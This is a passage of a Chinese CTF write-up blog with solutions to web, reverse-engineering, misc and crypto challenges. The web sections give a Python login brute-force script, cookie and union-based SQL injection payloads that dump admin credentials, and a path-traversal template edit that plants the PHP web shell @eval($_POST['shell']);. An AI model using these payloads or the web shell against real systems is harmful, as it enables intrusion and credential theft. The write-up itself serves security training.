+            <p><a target="_blank" rel="noopener" href="http://web.t.ctf.wgpsec.org/notjustweb/****被我吃掉了开心不~**/login.html">http://web.t.ctf.wgpsec.org/notjustweb/****被我吃掉了开心不~**/login.html</a></p>
+            </div>
+<p>还有一段加密文本</p>
+<div class="tip key"><p>Hint{4WIKZ2FPWTS3BD7FU6IOLJ4Q46C2PZ4JQ7UYPDHJTWRONHEJ4WS33ZFYTTUKLP7PXSGONHEJ42ZKDZU4RHUK7FPIX6D6RLVQ4S5IXZU4VTTITE7FXSAOLENC566J6===}</p>
+</div>
+<p>丢到一键解码去看看</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JH4jU.jpg" alt=""></p>
+<p>下载去看看，在最后发现一段话：</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JHjgK.jpg" alt=""></p>
+<p>得到完整后台地址：<span class="p gray">http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/login.html</span><br>打开，看见了登录地址。我们已知默认账户与密码，题目很直白得告诉了时间戳作为验证码。开始爆破：</p>
+<p>py大法：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ss=requests.session()</span><br><span class="line">cookies = {</span><br><span class="line">    <span class="string">'Hm_lvt_66e7271a2d04bba3f5a40e5544aca1ac'</span>: <span class="string">'1639048827'</span>,</span><br><span class="line">    <span class="string">'Hm_lpvt_66e7271a2d04bba3f5a40e5544aca1ac'</span>: <span class="string">'1639051053'</span>,</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'3iob2ucpstm2qpc07ckn20mp82'</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">headers = {</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://web.t.ctf.wgpsec.org'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/login.html'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9,en;q=0.8'</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">yzm</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="comment">#5位数密码列表</span></span><br><span class="line">    pwd=(<span class="string">"%05d"</span>%i)</span><br><span class="line">    <span class="comment">#get验证码刷新</span></span><br><span class="line">    ss.get(<span class="string">'http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/verifycode.php'</span>)</span><br><span class="line">    <span class="comment">#切片验证码，取后5位，因为发现验证码有时间差异，更改13个分秒差</span></span><br><span class="line">    r = <span class="built_in">str</span>(time.time())[<span class="number">5</span>:<span class="number">10</span>]</span><br><span class="line">    <span class="comment">#提取密码，可用于txt文件读取时</span></span><br><span class="line">    <span class="comment">#pwd = pwd.strip('\n')</span></span><br><span class="line">    <span class="comment">#提交数据</span></span><br><span class="line">    data = {<span class="string">'username'</span>: <span class="string">'admin'</span>,<span class="string">'password'</span>: pwd,<span class="string">'verifycode'</span>: r,<span class="string">'submit'</span>: <span class="string">''</span>}</span><br><span class="line">    <span class="comment">#POST提交</span></span><br><span class="line">    res = ss.post(<span class="string">'http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/login.php'</span>, headers=headers, cookies=cookies, data=data, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment">#返回状态信息，正则匹配显示关键信息</span></span><br><span class="line">    <span class="comment">#print("测试密码:%s--%s---%s"%(pwd,r,ts))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"测试密码:%s--验证码:%s---提示:%s"</span> % (pwd, r, res.text))</span><br><span class="line">    <span class="comment">#判断成功时输出并结束程序</span></span><br><span class="line">    <span class="keyword">if</span> res.text !=<span class="string">"&lt;script&gt;alert('用户名或密码错误');window.location.href='login.html'&lt;/script&gt;"</span> <span class="keyword">and</span> res.text !=<span class="string">"&lt;script&gt;alert('验证码错误');window.location.href='login.html'&lt;/script&gt;"</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"---------------------------------------密码:%s--------------------------------"</span>%pwd)</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    r=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        yzm(i)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JbVv8.png" alt=""></p>
+<p>得到flag：flag{9472B3B73531545428F2599A9E4E30C3}</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{9472B3B73531545428F2599A9E4E30C3}</p>
+</div>
+<h2 id="8-简单的Cookie注入"><a href="#8-简单的Cookie注入" class="headerlink" title="8. 简单的Cookie注入"></a>8. 简单的Cookie注入</h2><p>原理和<code>sql</code>注入是一样的,我们先找注入点</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7a0NJH.png" alt=""></p>
+<p>打开网页发现只有新闻，我们随便挑选一个新闻点击进去发现存在<code>id</code>值</p>
+<p>利用单引号报错，发现被拦截</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8004/shownews.asp?id=171’">http://59.63.200.79:8004/shownews.asp?id=171’</a></li>
+</ul>
+<p>结合题目我们将注入放到<code>cookie</code>，将<code>id</code>提到<code>cookie</code></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7a0yTS.png" alt=""></p>
+<p>再用单引号报错，就不会被拦截</p>
+<p>使用之前的<code>sql</code>语句进行注入</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8004/shownews.asp?id=171">http://59.63.200.79:8004/shownews.asp?id=171</a> order by 10 正常</li>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8004/shownews.asp?id=171">http://59.63.200.79:8004/shownews.asp?id=171</a> order by 11 异常<br>说明有10个字段</li>
+</ul>
+<p>我们利用<code>cookie</code>注入查看哪些可以回显(正常显示)我们猜测存在<code>admin</code>这个表</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7a0fln.png" alt=""></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie:id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://s4.ax1x.com/2022/01/17/7a0TTU.png" alt=""></p>
+<p>发现存在<code>admin</code>表，且返回的字段只有第二第三字段</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie="id="+escape("171 union select 1,username,password,4,5,6,7,8,9,10 from admin")</span><br></pre></td></tr></tbody></table></figure>
+<p>获取用户名及密码，由于密码采用的是<code>md5</code>解密，我们拿去解密即可得到用户名及密码。<a target="_blank" rel="noopener" href="https://cmd5.com/">Md5解密网站</a></p>
+<p>密码：b9a2a2b5dffb918c </p>
+<p>解密之后是：<psw>welcome</psw></p>
+<p>有了用户密码我们尝试登陆网站后台，试一下直接<code>admin</code>：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8004/admin">http://59.63.200.79:8004/admin</a></li>
+</ul>
+<p>或者利用御剑扫描器扫描目录</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aBcB6.png" alt=""></p>
+<p>利用账号密码登陆后台即可获得flag</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>zkz{welcome-control}</p>
+</div>
+<h2 id="9-SQL注入-难度提升"><a href="#9-SQL注入-难度提升" class="headerlink" title="9. SQL注入-难度提升"></a>9. SQL注入-难度提升</h2><p>打开页面发现是<code>bluecms</code>，根据题目提示是sql注入所以我们百度bluecms的sql注入</p>
+<p>发现<code>ad_js.php</code>文件存在注入，参数为<code>ad_id=</code></p>
+<p>可以利用<code>sqlmap</code>工具直接得到flag，为方便理解，这里仍然采用手注</p>
+<p>利用<code>order by</code> 语句判断字段数量，当<code>ad_id=1 order by 8</code>时出现错误，说明字段有7个</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aBbHf.png" alt=""></p>
+<p>发现只有第7个字段有回显</p>
+<p>利用第7个字段查询数据库名<br></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union select 1,2,3,4,5,6,database()</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aBx3j.png" alt=""></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></tbody></table></figure>
+<p>查询所有表名，再源码中查看</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aDKDx.png" alt=""></p>
+<p>查询blue_admin所有的字段名</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=blue_admin</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aDGPe.png" alt=""><br>发现报错，我们对表名进行<a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ox2str/">16进制编码</a></p>
+<ul>
+<li>Blue_admin=0x626c75655f61646d696e</li>
+</ul>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aDcxs.png" alt=""></p>
+<p>返回了表的字段名</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin</span><br></pre></td></tr></tbody></table></figure>
+<p>利用sql语句读取用户名和密码</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aDLs1.png" alt=""><br>对密码进行<a target="_blank" rel="noopener" href="http://www.chamd5.org/">md5解密</a></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7ar9RH.png" alt=""><br>密码为123abcufo</p>
+<p>登陆后台</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/bluecms/uploads/admin">http://59.63.200.79:8003/bluecms/uploads/admin</a></li>
+</ul>
+<p><img src="https://s4.ax1x.com/2022/01/17/7armFS.png" alt=""><br>利用[<code>模板管理</code>]可对网站源代码进行修改</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aryTK.png" alt=""></p>
+<p>抓包修改编辑网页文件</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7arHk8.png" alt=""></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/bluecms/uploads/admin/tpl_manage.php?act=edit&amp;tpl_name=../../news_cat.php">http://59.63.200.79:8003/bluecms/uploads/admin/tpl_manage.php?act=edit&amp;tpl_name=../../news_cat.php</a></li>
+</ul>
+<p>插入一句话木马<code>@eval($_POST['shell']);</code></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7asbHx.png" alt=""></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aySvd.png" alt=""></p>
+<p>拿到服务器权限，然后翻找服务器上的flag，最终在C盘找到<code>flag.txt</code></p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>zkz{F3ck_power_3y3stem}</p>
+</div>
+<h2 id="10-最强大脑"><a href="#10-最强大脑" class="headerlink" title="10. 最强大脑"></a>10. 最强大脑</h2><p>根据题目意思就计算结果之后提交，作答正确<strong>多次</strong>后获得flag</p>
+<p><em>多次</em>，圈起来，要考。</p>
+<p>要求请输入一个位数大于21的数</p>
+<p>根据21位这样算肯定有问题，我们利用0填充到21位</p>
+<ul>
+<li>0000000000000000000001</li>
+</ul>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aHmzn.png" alt=""></p>
+<p>手输肯定来不及，python利用POST也有问题</p>
+<p>尝试Python+Selenium</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span>  webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">driver = webdriver.Chrome(<span class="string">'E:\Chrome\chromedriver.exe'</span>)</span><br><span class="line">driver.get(<span class="string">'http://web.t.ctf.wgpsec.org/wgpsecZQDN/'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">':'</span>)</span><br><span class="line">    html=driver.page_source</span><br><span class="line">    driver.find_element_by_name(<span class="string">'input'</span>).clear()</span><br><span class="line">    driver.find_element_by_xpath(<span class="string">'//*[@id="article_list"]/form/input[2]'</span>).clear()</span><br><span class="line">    data2 = re.findall(<span class="string">r'inline;"&gt;(.+?)&lt;/div&gt;'</span>, html)</span><br><span class="line">    a = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data2)):</span><br><span class="line">        a = a + data2[i]</span><br><span class="line">    p=<span class="built_in">str</span>(random.randint(<span class="number">21</span>,<span class="number">31</span>))</span><br><span class="line">    a0 = <span class="string">'000000000000000000000'</span>+p</span><br><span class="line">    driver.find_element_by_name(<span class="string">'input'</span>).send_keys(a0)</span><br><span class="line">    a1 = p+ a</span><br><span class="line">    a2 = <span class="built_in">eval</span>(a1.strip(<span class="string">"="</span>))</span><br><span class="line">    <span class="built_in">print</span>(a1, a2)</span><br><span class="line">    driver.find_element_by_xpath(<span class="string">'//*[@id="article_list"]/form/input[2]'</span>).send_keys(a2)</span><br><span class="line">    driver.find_element_by_xpath(<span class="string">'//*[@id="article_list"]/form/input[3]'</span>).click()</span><br><span class="line">    alert = driver.switch_to.alert  <span class="comment"># 切到弹出框</span></span><br><span class="line">    <span class="built_in">print</span>(alert.text)</span><br><span class="line">    alert.accept()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><em>利用input做一个短暂的暂停，避免出现卡顿导致程序错误</em></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aH4w8.png" alt=""></p>
+<p>随便输入数值即可</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aHqln.png" alt=""></p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{C9A8BF0E9732776714284EEF16C34B94} </p>
+</div>
+<hr>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-简单的逆向"><a href="#1-简单的逆向" class="headerlink" title="1. 简单的逆向"></a>1. 简单的逆向</h2><p>查看一下，发现该<code>exe</code>为<code>32位</code>执行程序</p>
+<p>使用<code>IDA</code>工具打开</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aGBLQ.png" alt=""></p>
+<p>定位主函数<code>main</code>按下<code>F5</code>查看伪代码</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aG4L4.png" alt=""></p>
+<p>得到flag</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{Welcome_to_GeekFZCTF}</p>
+</div>
+<h2 id="2-简单的逆向2"><a href="#2-简单的逆向2" class="headerlink" title="2. 简单的逆向2"></a>2. 简单的逆向2</h2><p>同样，<code>32位</code>exe程序，定位到主函数查看伪代码</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aJSwd.png" alt=""></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aJVOg.png" alt=""></p>
+<p>打开函数</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aJakR.png" alt=""></p>
+<p>选中数值按下<code>R</code></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aJBp6.png" alt=""></p>
+<p>连起来即是flag</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{sAdf_fDfkl_Fdf}</p>
+</div>
+<hr>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="1-不会吧？不会吧？你不知道它？"><a href="#1-不会吧？不会吧？你不知道它？" class="headerlink" title="1. 不会吧？不会吧？你不知道它？"></a>1. 不会吧？不会吧？你不知道它？</h2><p>得到题目：</p>
+<div class="note no-icon flat"><p>哦耶！这么简单？？？<br>N0NDRTc5OEUtNjkyMC00NjI2LUE4RDctMzUyQUUyQUMyODk5</p>
+</div>
+<p>复制下来扔一键解密里看看</p>
+<ul>
+<li>base64解码: 7CCE798E-6920-4626-A8D7-352AE2AC2899</li>
+</ul>
+<p>当然也可以用<a target="_blank" rel="noopener" href="http://www.hiencode.com/">CTF在线工具箱</a>进行base64解码</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{7CCE798E-6920-4626-A8D7-352AE2AC2899}</p>
+</div>
+<h2 id="2-哇，这个学废了一定用得到！"><a href="#2-哇，这个学废了一定用得到！" class="headerlink" title="2. 哇，这个学废了一定用得到！"></a>2. 哇，这个学废了一定用得到！</h2><p>下载附件下来，是一个word文档。但是加密了。</p>
+<p>利用word密码爆破工具或者<a target="_blank" rel="noopener" href="https://rixler.password-find.com/">在线office密码删除</a>处理一下</p>
+<p>密码就在折线图下</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{9c2965fa13be342b8e70a50410bc76bd}</p>
+</div>
+<h2 id="3-听说过Audacity吗？"><a href="#3-听说过Audacity吗？" class="headerlink" title="3. 听说过Audacity吗？"></a>3. 听说过Audacity吗？</h2><p>下载附件，是一段MP3文件。</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7Ytnat.jpg" alt=""></p>
+<p>用耳朵听听就知道是摩斯密码,用<code>Audacity</code>工具打开看看频段，用.和-记录下长短音，空格间隔开，得到<br></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... .-.. . .. -.-. .. -.-. - ... - .-- --- --- -.-. ..-. . -- -.-. -. .----</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>扔进一键解密，或者<a target="_blank" rel="noopener" href="http://www.hiencode.com/morse.html">在线摩斯密码解码器</a>得到：HLEICICTSTWOOCFEMCN1</p>
+<p>提交flag，但是错误。将解出来的HLEICICTSTWOOCFEMCN1再扔进解码器，在栅栏解密分为4栏时，我们似乎发现了有意义的组合：HIWELCOMETOCISCNCTF1</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{HIWELCOMETOCISCNCTF1}</p>
+</div>
+<h2 id="4-Stegsolve-yyds！"><a href="#4-Stegsolve-yyds！" class="headerlink" title="4. Stegsolve yyds！"></a>4. Stegsolve yyds！</h2><p>下载附件，得到一张图片。题目提示Stegsolve，我们用Stegsolve打开图片看看</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7Ya95q.png" alt=""></p>
+<p>多换几个色度通道就发现了flag</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{L1nux3rr0r}</p>
+</div>
+<h2 id="5-你知道怎样破坏一个文件吗？"><a href="#5-你知道怎样破坏一个文件吗？" class="headerlink" title="5. 你知道怎样破坏一个文件吗？"></a>5. 你知道怎样破坏一个文件吗？</h2><p>下载附件，提示文件损坏。010编辑器打开看看。发现文件头只剩个<code>9a</code>，我们补全<code>GIF</code>的文件头<code>GIF89a</code></p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7Yd61K.png" alt=""></p>
+<p>嗯，好了，正常打开。得到flag</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{2017_love_U}</p>
+</div>
+<h2 id="6-哦-原来二维码在这里呀"><a href="#6-哦-原来二维码在这里呀" class="headerlink" title="6. 哦~原来二维码在这里呀"></a>6. 哦~原来二维码在这里呀</h2><p><img src="https://s4.ax1x.com/2022/01/16/7tpIIK.png" alt=""></p>
+<p>010编辑器打开看看，在<code>ascii</code>字段发现有一个<code>fl49.xlsx</code>文件，且有<code>PK</code>关键词，可以得知在图片中藏了压缩包。</p>
+<p>对图片进行分离或者直接将其后缀改为<code>zip</code>。</p>
+<p>打开压缩包，发现加密。查看压缩包全局方式位，不是伪加密。（详见文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/9824557.html">压缩包真伪加密</a>）</p>
+<p>使用<code>Ziperello</code>工具爆破处理。</p>
+<p><img src="https://s4.ax1x.com/2022/01/16/7t9wSe.png" alt=""></p>
+<p>得到密码，解压查看<code>fl49.xlsx</code>。</p>
+<p><img src="https://s4.ax1x.com/2022/01/16/7t9XpF.png" alt=""></p>
+<p>观察一下，发现其中有价值的信息为1与空白单元格组成的二维表，共有6个工作表，每个表刚好4列24行。</p>
+<p>6个表即可组成24*24的一个二维表。将其按月份拼在一起，对有值的单元格涂黑，空值为白。单元格处理为正方形，可得到二维码：</p>
+<p><img src="https://s4.ax1x.com/2022/01/16/7tCr3F.png" alt=""></p>
+<p>二维码识别得到：zfua{B3s1o9in1Nw0halUnofuNc0HM1}</p>
+<p>似乎不对，我们对其再解码。这是段凯撒解密，解密得：flag{H3y1u9ot1Tc0ngrAtulaTi0NS1}</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{H3y1u9ot1Tc0ngrAtulaTi0NS1}</p>
+</div>
+<h2 id="7-可恶的黑客"><a href="#7-可恶的黑客" class="headerlink" title="7. 可恶的黑客"></a>7. 可恶的黑客</h2><p>下载附件，是一段流量分析。<code>wireshark</code>往里放</p>
+<p><img src="https://img-blog.csdnimg.cn/20200411160512274.png" alt=""></p>
+<p>我们对流量进行过滤一下，查看<code>post</code>请求的包</p>
+<p><img src="https://img-blog.csdnimg.cn/20200411160718418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>其他包都是在<code>/images/</code>下，发现有一个异常包</p>
+<p><img src="https://img-blog.csdnimg.cn/2020041116081341.png" alt=""></p>
+<p>追踪流</p>
+<p><img src="https://img-blog.csdnimg.cn/20200411161533559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>发现一串<code>Unicode</code>编码<br></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#49;&amp;#97;&amp;#103;&amp;#123;&amp;#115;&amp;#105;&amp;#49;&amp;#49;&amp;#121;&amp;#98;&amp;#48;&amp;#121;&amp;#101;&amp;#109;&amp;#109;&amp;#109;&amp;#125;</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>解码得到：f1ag{si11yb0yemmm}，注意格式，将1改为<code>l</code></p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{si11yb0yemmm}</p>
+</div>
+<hr>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-简单的RSA解密"><a href="#1-简单的RSA解密" class="headerlink" title="1. 简单的RSA解密"></a>1. 简单的RSA解密</h2><p>打开附件，得到<code>n</code>，<code>e</code>，<code>c</code></p>
+<p>利用风二西的<code>RSA</code>工具，将值复制到对应的框中</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aJb7j.png" alt=""></p>
+<p>右键分解<code>N</code>，得到：</p>
+<ul>
+<li><p>p=368751654879714877087975516875168751974879716873087714877516875971487715</p>
+</li>
+<li><p>q=368751654879714877087975516875168751974879716873087714877516875971487715687518277898523</p>
+</li>
+</ul>
+<p>再右键选择计算私钥得到<code>D</code></p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aYuuD.png" alt=""></p>
+<p>右键计算明文，然后明文转字符</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aYOqe.jpg" alt=""></p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{4e9f2a7f-bda9-4a46-af51-b29e0c61973e}</p>
+</div>
+<h2 id="2-Manycode"><a href="#2-Manycode" class="headerlink" title="2. Manycode"></a>2. Manycode</h2><p>下载附件，一堆奇奇怪怪的东西</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7ataz6.png" alt=""></p>
+<p>我也不知道是啥，万能的百度告诉我是<code>AAencode</code>编码。</p>
+<p>解码得到：<a target="_blank" rel="noopener" href="http://www.hiencode.com/aaencode.html">在线解码</a></p>
+<ul>
+<li>54464E4C536E744F516C396F6457467A614756755A33303D</li>
+</ul>
+<p>这是<code>base16</code>编码，再解码得到：</p>
+<ul>
+<li>TFNLSntOQl9odWFzaGVuZ30=</li>
+</ul>
+<p>这是<code>base64</code>编码，再解码得到：</p>
+<ul>
+<li>LSKJ{NB_huasheng}</li>
+</ul>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>LSKJ{NB_huasheng}</p>
+</div>
+<h2 id="3-CuteCaesar"><a href="#3-CuteCaesar" class="headerlink" title="3. CuteCaesar"></a>3. CuteCaesar</h2><p>嗷嗷嗷~</p>
+<p><img src="https://s4.ax1x.com/2022/01/17/7aUUKK.png" alt=""></p>
+<p>这是啥呢?叫兽编码[滑稽`༼ つ ◕_◕ ༽つ]<a target="_blank" rel="noopener" href="https://roar.iiilab.com/">兽音译者在线</a></p>
+<p>解码得到：LSKJ{linxi_welcome}</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>LSKJ{linxi_welcome}</p>
+</div>
+<hr>
+<div class="tag link"><a class="link-card" title="蓝色空间CTF" target="_blank" rel="noopener" href="https://lieren.xyz/"><div class="left"><img src="http://lieren.xyz/favicon.ico"></div><div class="right"><p class="text">蓝色空间CTF</p><p class="url">https://lieren.xyz/</p></div></a></div>
+<div class="note info no-icon flat"><p>写在最后(　o=^•ェ•)o　┏━┓</p>
+</div>
